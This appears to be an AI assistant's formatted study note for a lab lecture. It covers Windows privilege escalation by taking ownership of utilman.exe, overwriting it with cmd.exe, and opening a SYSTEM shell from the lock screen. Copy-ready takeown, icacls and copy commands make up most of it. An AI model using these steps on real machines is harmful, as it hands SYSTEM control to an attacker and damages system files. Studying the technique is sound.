
Here’s a detailed, well-organized Obsidian note for your lecture. It's structured for **easy recall**, with **headings**, **code blocks**, and **callouts** to highlight key concepts.

---

## 🔒 Privilege Escalation via `SeTakeOwnershipPrivilege` & `utilman.exe` Abuse

### 🧠 Summary

In this method, we escalate privileges on a Windows machine by abusing the `SeTakeOwnershipPrivilege` to take control of the `utilman.exe` binary, ultimately obtaining a **SYSTEM-level shell**.

---

### 🪪 Step 1: Check Current Privileges

Open **Command Prompt as Administrator**:

* Right-click `cmd.exe` > **Run as Administrator**
* Input password if prompted (for elevation)

Check available privileges:

```cmd
whoami /priv
```

🔍 Example output:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

---

### 🧰 Step 2: Understanding `utilman.exe`

> `utilman.exe` = Windows Utility Manager
> Located at: `C:\Windows\System32\Utilman.exe`
> Role: Provides Ease of Access tools at the **lock screen**
> 🔐 Runs with **SYSTEM** privileges by default

✅ **Goal**: Replace `utilman.exe` with a payload (e.g., `cmd.exe`) to trigger a SYSTEM-level shell.

---

### 🛠 Step 3: Take Ownership of `utilman.exe`

Run:

```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

🗨️ You’ll see:

```
SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

---

### 🧾 Step 4: Grant Full Permissions

> Taking ownership ≠ having full access
> You must **grant yourself full control**:

```cmd
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Output:

```
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

---

### 🧱 Step 5: Replace utilman.exe with cmd.exe

Navigate to System32 directory and copy `cmd.exe` over `utilman.exe`:

```cmd
cd C:\Windows\System32
copy cmd.exe utilman.exe
```

Output:

```
        1 file(s) copied.
```

---

### 🔐 Step 6: Trigger the SYSTEM Shell

1. **Lock the computer**:

   * Start Menu > Lock

2. **Click “Ease of Access” button** on the lock screen

   * This runs `utilman.exe`, now replaced with `cmd.exe`

3. 🚀 A Command Prompt window appears, running as **NT AUTHORITY\SYSTEM**

---

### ✅ Summary of Commands

```cmd
whoami /priv
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant YourUserName:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

---

### ⚠️ Notes & Caution

* This technique **requires administrator rights** to initiate.
* It is often blocked by modern **Endpoint Detection & Response (EDR)** tools.
* Replacing system binaries like `utilman.exe` is a known privilege escalation tactic and may trigger alarms.
* Always restore the original file after testing to avoid system instability.

---


